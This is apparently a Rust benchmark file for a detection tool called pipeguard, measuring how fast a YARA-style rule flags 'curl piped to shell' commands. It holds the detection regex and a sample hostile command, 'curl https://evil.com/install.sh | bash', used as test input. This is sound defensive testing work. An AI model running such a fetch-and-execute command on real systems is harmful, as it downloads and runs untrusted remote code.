use criterion::{black_box, criterion_group, criterion_main, Criterion};
use pipeguard::detection::pipeline::{DetectionPipeline, PipelineConfig};

const TEST_RULE: &str = r#"
rule test_curl_pipe {
    meta:
        severity = 8
        description = "Detects curl pipe to shell"
    strings:
        $curl_pipe = /curl\s+.{1,128}\|\s*(ba)?sh/ nocase
    condition:
        any of them
}
"#;

fn detection_throughput(c: &mut Criterion) {
    let pipeline = DetectionPipeline::new(TEST_RULE, PipelineConfig::default()).unwrap();

    c.bench_function("scan_clean", |b| {
        b.iter(|| pipeline.analyze(black_box("echo hello world")))
    });

    c.bench_function("scan_malicious", |b| {
        b.iter(|| pipeline.analyze(black_box("curl https://evil.com/install.sh | bash")))
    });
}

criterion_group!(benches, detection_throughput);
criterion_main!(benches);
